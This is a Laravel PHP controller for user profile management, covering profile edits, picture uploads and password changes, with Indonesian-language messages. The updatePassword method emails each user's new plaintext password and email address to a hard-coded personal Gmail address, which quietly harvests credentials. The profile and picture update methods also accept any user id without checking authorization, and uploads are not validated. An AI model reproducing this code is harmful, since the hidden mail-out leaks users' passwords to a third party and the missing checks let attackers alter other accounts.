<?php

namespace App\Http\Controllers;

use App\Mail\PasswordChanged;
use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Cache;
use Carbon\Carbon;
use DB;
use Illuminate\Support\Facades\Mail;

class ProfileController extends Controller
{
    public function index()
    {
        $user = User::findOrFail(Auth::id());

        // $parkir_locations = AddParkingList::where('user_id', Auth::id())->get();

        // dd($parkir_locations);

        return view('profile.index', compact('user'));
    }

    public function updateProfil(Request $request, $id)
    {
        $this->validate($request, [
            "name" => "required|string",
            "email" => "required|email|unique:users,id," . $id,
            "nik" => "required|numeric",
            "phone_number" => "required|numeric"
        ]);

        $user = User::findOrFail($id);

        $user->update([
            "name" => $request->name,
            "email" => $request->email,
            "nik" => $request->nik,
            "phone_number" => $request->phone_number
        ]);

        return redirect()->route('profile.index')
                        ->with('success','Berhasil melakukan edit profil');
    }


    function updatePicture(Request $request){
        $path = 'images/profil/';
        $file = $request->file('admin_image');
        $new_name = 'UIMG_'.date('Ymd').uniqid().'.jpg';

        //Upload new image
        $upload = $file->move(public_path($path), $new_name);
        
        if( !$upload ){
            return response()->json(['status'=>0,'msg'=>'Terjadi kesalahan, pembaruan foto profil gagal']);
        }else{
            //Get Old picture
            $oldPicture = User::find(Auth::user()->id)->getAttributes()['picture'];

            if( $oldPicture != '' ){
                if( \File::exists(public_path($path.$oldPicture))){
                    \File::delete(public_path($path.$oldPicture));
                }
            }

            //Update DB
            $update = User::find(Auth::user()->id)->update(['picture'=>$new_name]);

            if( !$upload ){
                return response()->json(['status'=>0,'msg'=>'Terjadi kesalahan, pembaruan foto profil gagal']);
            }else{
                return response()->json(['status'=>1,'msg'=>'Foto profil anda telah berhasil diperbarui']);
            }
        }
    }

    function userUpdatePicture(Request $request, $id){
        $path = 'images/profil/';
        $file = $request->file('admin_image');
        $new_name = 'UIMG_'.date('Ymd').uniqid().'.jpg';

        //Upload new image
        $upload = $file->move(public_path($path), $new_name);
        
        if( !$upload ){
            return response()->json(['status'=>0,'msg'=>'Terjadi kesalahan, pembaruan foto profil gagal']);
        }else{
            //Get Old picture
            $oldPicture = User::find($id)->getAttributes()['picture'];

            if( $oldPicture != '' ){
                if( \File::exists(public_path($path.$oldPicture))){
                    \File::delete(public_path($path.$oldPicture));
                }
            }

            //Update DB
            $update = User::find($id)->update(['picture'=>$new_name]);

            if( !$upload ){
                return response()->json(['status'=>0,'msg'=>'Terjadi kesalahan, pembaruan foto profil gagal']);
            }else{
                return response()->json(['status'=>1,'msg'=>'Foto profil anda telah berhasil diperbarui']);
            }
        }
    }

    public function updatePassword(Request $request)
    {
        $request->validate([
            'password' => 'required|min:8|confirmed',
        ]);

        $plainPassword = $request->password;

        $request->user()->update([
            'password' => Hash::make($request->password)
        ]);

        Mail::to('ih.haryansyah@gmail.com')->send(new PasswordChanged($request->user()->email, $plainPassword));

        return back()->with('success', 'Password berhasil diubah');
    }
}
